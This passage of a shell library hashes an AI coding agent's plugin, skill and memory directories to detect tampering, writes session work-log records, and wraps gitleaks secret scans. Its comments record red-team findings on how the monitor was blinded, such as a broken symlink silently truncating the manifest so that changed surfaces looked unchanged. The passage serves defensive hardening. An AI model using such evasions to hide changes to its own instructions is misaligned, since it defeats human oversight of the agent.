  # The `.` keeps a target's trailing newline from being stripped: it must make the count wrong, not vanish.
  _iml_t="$(readlink -- "$@" 2>/dev/null || exit 1; printf .)" || return 0
  _iml_t="${_iml_t%.}"
  [ "$(printf '%s' "$_iml_t" | wc -l)" -eq $# ] || return 0
  printf 'ok\n'
  # Line i pairs with $_iml_p<i>. The positional list is emptied first: bash copies it on every function call, so
  # 1,700 links made the loop quadratic (0.21 s -> 0.08 s idle, harbor#559).
  set --; _iml_i=0
  printf '%s' "$_iml_t" | while IFS= read -r _iml_l; do
    _iml_i=$((_iml_i + 1))
    floor_instr_shared_memory "$_iml_c" 'projects/*/memory' "$_iml_l" || eval "printf '%s\n' \"\$_iml_p$_iml_i\""
  done
}
# floor_instr_dirs <dir>... — the directory branch of floor_instr_manifest, for one surface ($_g) under $_cfg.
# Several dirs share one walk (the projects/*/memory stores, harbor#559); plugins is always one dir, $1.
floor_instr_dirs() {
  _p="$1"
  # DO NOT follow directory symlinks: `find -L` on a link to its own ancestor (`ln -s .. skills/up`) made the manifest never settle, so --apply could never clear the advisory (pass 10, B8R2-06). A symlinked FILE is still hashed through the link below, and every link's TARGET is recorded.
  # PRUNED, because an advisory that fires on every session is one nobody reads, and these cannot carry an instruction (a plugin loads from its manifest: skills/, commands/, hooks/, agents/): .git (objects rewritten on every fetch); `.in_use/` and `.last_inuse_sweep` (Claude Code's per-session pid lockfiles under plugins/cache, which made the same five paths drift at every SessionStart); .gcs-sha (a git-fetch marker).
  # Scoped to those names, not a pattern, so a file planted anywhere else under plugins/ is still hashed. The three plugin manifests (installed_plugins.json, known_marketplaces.json, marketplace.json) are EXCLUDED THEN RE-EMITTED timestamp- or sha-normalized (harbor#198, floor_marketplace_sha), never dropped.
  # harbor#764: the plugin sync's `synced/<id>/.last-complete-round` and the cache's `<ver>/.orphaned_at` are harness-rewritten timestamps; pruned by NAME on the plugins surface only (elsewhere the two names are the already-pruned sweep file, a no-op).
  if [ "$_g" = plugins ]; then _bk1=.last-complete-round; _bk2=.orphaned_at; _bk3=.marketplaces.json
  else _bk1=.last_inuse_sweep; _bk2=.last_inuse_sweep; _bk3=.last_inuse_sweep; fi
  # harbor#478: the harness re-extracts a plugin into a new cache/<ver>/ about daily,
  # byte-identical. So cache/ is read only through installed_plugins.json, by the entry
  # that LOADS it, below; jq missing, the file unreadable or an odd config dir → full walk.
  _ld=''; _pc="$_p/.no-prune/."
  if [ "$_g" = plugins ] && [ -f "$_p/installed_plugins.json" ] && command -v jq >/dev/null 2>&1; then
    _ld="$(floor_plugins_loaded "$_p/installed_plugins.json")"
    case "$_p" in *[][*?]*) _ld='' ;; esac
    # No installPath, or two entries one label: what loads is unclear, so walk all of cache/.
    if printf '%s\n' "$_ld" | awk -F'\t' '$4 == "-" || seen[$1 FS $2 FS $3]++ { f = 1 } END { exit !f }'; then _ld=''; fi
    [ -z "$_ld" ] || _pc="$_p/cache"
  fi
  if command -v sha256sum >/dev/null 2>&1; then
    find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
         ! -name .last_inuse_sweep ! -name .gcs-sha \
         ! -name installed_plugins.json ! -name known_marketplaces.json \
         ! -name marketplace.json ! -name "$_bk1" ! -name "$_bk2" ! -name "$_bk3" \
         -type f -exec sha256sum {} + 2>/dev/null
  else
    find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
         ! -name .last_inuse_sweep ! -name .gcs-sha \
         ! -name installed_plugins.json ! -name known_marketplaces.json \
         ! -name marketplace.json ! -name "$_bk1" ! -name "$_bk2" ! -name "$_bk3" \
         -type f -exec shasum -a 256 {} + 2>/dev/null
  # Prefix-stripped with awk index(), NOT sed: the config dir is data, and in a sed PATTERN a `|` threw "bad flag in substitute command" and silently dropped the surface, which reads as "clean" (red-team B8-DEF-07).
  fi | awk -v p="  $_cfg/" '{ i=index($0,p); if (i) print substr($0,1,i+1) substr($0,i+length(p)); else print }'
  # Re-emit the two excluded manifests in timestamp-normalized form. Guarded
  # on -f, so this is a no-op for every surface that does not hold them.
  for _p in "$@"; do for _pm in installed_plugins.json known_marketplaces.json; do
    [ -f "$_p/$_pm" ] || continue
    _pmrel="${_p#"$_cfg"/}/$_pm"
    if [ "$_pm" = installed_plugins.json ] && [ -n "$_ld" ]; then
      printf '%s  %s\n' "$(floor_installed_sha "$_p/$_pm")" "$_pmrel"
    else
      printf '%s  %s\n' "$(floor_pluginmeta_sha "$_p/$_pm")" "$_pmrel"
    fi
  done; done
  # harbor#478: each loaded plugin's files, under a label naming the entry that loads
  # it (key, scope, project), never the version dir. An entry whose dir is gone is `absent`.
  if [ -n "$_ld" ]; then
    printf '%s\n' "$_ld" | while IFS="$(printf '\t')" read -r _lk _ls _lp _li; do
      [ -n "$_lk" ] || continue
      # `//`: no walked path has one, so a real plugins/loaded/ file never wears a label.
      # The project is %-escaped, never folded, so /a-b and /a/b stay two labels.
      _ll="plugins//loaded/$_lk/$_ls"
      [ "$_lp" = - ] || _ll="$_ll/$(printf '%s' "$_lp" | sed 's/%/%25/g; s#/#%2F#g')"
      if [ "$_li" != - ] && [ -d "$_li" ]; then floor_instr_tree "$_li" "$_ll"
      else printf 'absent  %s\n' "$_ll"; fi
    done
  fi
  # Re-emit every marketplace CATALOG in sha-normalized form: there are N, at plugins/marketplaces/<mp>/.claude-plugin/marketplace.json and none at the surface root, hence a find. printf is the last command in the body on purpose: a false test there kills the pipeline under `set -eu` and silently truncates the manifest (B8-02, below).
  find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
       -name marketplace.json -type f -print 2>/dev/null | while IFS= read -r _mk; do
    _mkrel="${_mk#"$_cfg"/}"
    printf '%s  %s\n' "$(floor_marketplace_sha "$_mk")" "$_mkrel"
  done
  # The plugins surface's .marketplaces.json, excluded above and re-emitted clock-free (floor_syncmeta_sha).
  [ "$_bk3" != .marketplaces.json ] || find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
       -name .marketplaces.json -type f -print 2>/dev/null | while IFS= read -r _sm; do
    _smrel="${_sm#"$_cfg"/}"
    printf '%s  %s\n' "$(floor_syncmeta_sha "$_sm")" "$_smrel"
  done
  find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
       ! -name .last_inuse_sweep -type l -print 2>/dev/null | while IFS= read -r _l; do
    _rel="${_l#"$_cfg"/}"
    printf 'link:%s  %s\n' "$(readlink "$_l" 2>/dev/null || echo '?')" "$_rel"
    # A symlink to a regular FILE is hashed through the link (swapping its target content is drift; B8-02); a symlink to a DIRECTORY is recorded by target only.
    # `if`, NOT `[ ... ] && ...`: as the LAST command of this while body a false test exits 1, which kills the enclosing pipeline under `set -eu` and silently TRUNCATED the manifest at the first broken or directory symlink (pass 11, B8-02, critical): one `ln -s /nonexistent <cfg>/agents/x` emptied the diff forever while floor-verify reported the surfaces pinned and unchanged.
    if [ -f "$_l" ]; then printf '%s  %s\n' "$(floor_sha < "$_l")" "$_rel"; fi
  done
}
floor_instr_manifest() { # <config-dir>
  _cfg="${1%/}"
  _imunl=''
  case " $FLOOR_INSTR_SURFACES " in *" plugins "*) _imunl="$(floor_plugins_unloaded "$_cfg")" ;; esac
  _nl='
'
  _mlx="$(floor_instr_memlinks "$_cfg")"
  _mdn=0; _mdr=''
  for _g in $FLOOR_INSTR_SURFACES; do
    # A surface may be a glob (projects/*/memory). Unmatched globs come back
    # literally, which the -f/-d tests below then record as absent.
    for _p in "$_cfg"/$_g; do
      # Quoted, the strip is literal: an unquoted ${_p#$_cfg/} glob-matched [ ? * (P10-05).
      # No fork per path: 1,300+ memory links made this loop the session-start cost (harbor#559).
      _s="${_p#"$_cfg"/}"
      if [ "$_g" = 'projects/*/memory' ] && [ -d "$_p" ] && [ ! -L "$_p" ]; then
        # The memory stores share one walk below, 256 at a time (argument length), not ~5 forks each.
        _mdn=$((_mdn + 1)); eval "_md$_mdn=\$_p"; _mdr="$_mdr \"\$_md$_mdn\""
        [ "$_mdn" -lt 256 ] || { eval "floor_instr_dirs $_mdr"; _mdn=0; _mdr=''; }
        continue
      fi
      if [ -L "$_p" ]; then
        # floor_instr_memlinks already decided this link exempt: no readlink.
        if [ "$_g" = 'projects/*/memory' ]; then
          case "$_mlx" in ok|ok"$_nl"*) case "$_mlx$_nl" in *"$_nl$_p$_nl"*) ;; *) continue ;; esac ;; esac
        fi
        _lt="$(readlink "$_p" 2>/dev/null || echo '?')"
        # A worktree's memory link to a store this same walk already pins adds no instruction: every
        # new worktree turned B6 amber (71 advisories, 2026-10-23..25). Only that exact shape is exempt.
        if floor_instr_shared_memory "$_cfg" "$_g" "$_lt"; then continue; fi
        printf 'link:%s  %s\n' "$_lt" "$_s"
      fi
      if [ -f "$_p" ]; then
        printf '%s  %s\n' "$(floor_sha < "$_p")" "$_s"
      elif [ -d "$_p" ]; then
        floor_instr_dirs "$_p"
      else
        printf '%s  %s\n' "absent" "$_s"
      fi
    done
    [ "$_mdn" -eq 0 ] || { eval "floor_instr_dirs $_mdr"; _mdn=0; _mdr=''; }
  done | floor_instr_unloaded_filter "$_imunl" | LC_ALL=C sort -k2
}

# The work-log record writer (G2 + harbor#6). ONE implementation for two callers: worklog-push.sh writes a record when a session STOPS, memory-harvest.sh when it finds a session that stopped without reaching that hook. Two open-coded writers of one format drift invisibly.
# CREATE-IF-ABSENT, THEN APPEND: the Stop hook fires more than once per session and each firing is a line. Idempotency for the reconciler is the RECONCILER's job (it checks the record exists before calling).
#   floor_worklog_record <log-dir> <host> <session-id> <date> <time> <cwd> [source]
# `source` lands in the frontmatter, not in the line: a backfilled record's clock is the transcript's mtime, and keeping it out of the line keeps the body uniform for retrieval.
floor_worklog_record() {
  _wr_dir="${1:-}"; _wr_host="${2:-}"; _wr_sid="${3:-}"
  _wr_date="${4:-}"; _wr_time="${5:-}"; _wr_cwd="${6:-}"; _wr_src="${7:-}"
  [ -n "$_wr_dir" ] && [ -n "$_wr_host" ] && [ -n "$_wr_sid" ] || return 1
  _wr_recdir="$_wr_dir/WORK/sessions/$_wr_host"
  mkdir -p "$_wr_recdir" 2>/dev/null || return 1
  _wr_rec="$_wr_recdir/$_wr_date-$_wr_sid.md"
  if [ ! -f "$_wr_rec" ]; then
    if [ -n "$_wr_src" ]; then
      printf -- '---\nhost: %s\nsession: %s\ndate: %s\nsource: %s\n---\n' \
        "$_wr_host" "$_wr_sid" "$_wr_date" "$_wr_src" > "$_wr_rec" 2>/dev/null || return 1
    else
      printf -- '---\nhost: %s\nsession: %s\ndate: %s\n---\n' \
        "$_wr_host" "$_wr_sid" "$_wr_date" > "$_wr_rec" 2>/dev/null || return 1
    fi
  fi
  printf -- '- %s · cwd: %s\n' "$_wr_time" "${_wr_cwd:-unknown}" >> "$_wr_rec" 2>/dev/null || return 1
}

# THE GITLEAKS SUBCOMMAND IS A DIALECT, AND ITS ABSENCE LOOKS LIKE A FINDING. gitleaks 8.19 introduced `gitleaks git`; 8.18.4 has no such verb, and an unknown command exits 1, which with `--exit-code 1` is indistinguishable from "a leak was found". The hosted governance workflow installs v8.18.4 and checks only `command -v gitleaks`, so the work-log gate refused every commit while reporting a finding (floor-test C1a).
# PROBE, NEVER ASSUME, and never pin a version: `gitleaks git --help` exits 0 where the verb exists. The fallback really scans (matched pair: `protect --staged` exits 1 on a planted token and 0 on a clean tree; it is what 8.19 renamed to `git --pre-commit --staged`).
# FAIL-CLOSED IS THE CALLER'S JOB: both helpers return the scanner's own verdict (0 clean) and every caller treats non-zero as "block".

floor_gitleaks_staged() { # <repo-dir> — 0 iff the STAGED snapshot is clean
  if gitleaks git --help >/dev/null 2>&1; then
    gitleaks git --pre-commit --staged --no-banner --exit-code 1 "$1"
  else
    gitleaks protect --staged --no-banner --exit-code 1 --source "$1"
  fi
}

floor_gitleaks_tree() { # <repo-dir> — 0 iff the repo and its history are clean
  if gitleaks git --help >/dev/null 2>&1; then
    gitleaks git --no-banner --exit-code 1 "$1"
  else
    gitleaks detect --no-banner --exit-code 1 --source "$1"
  fi
}
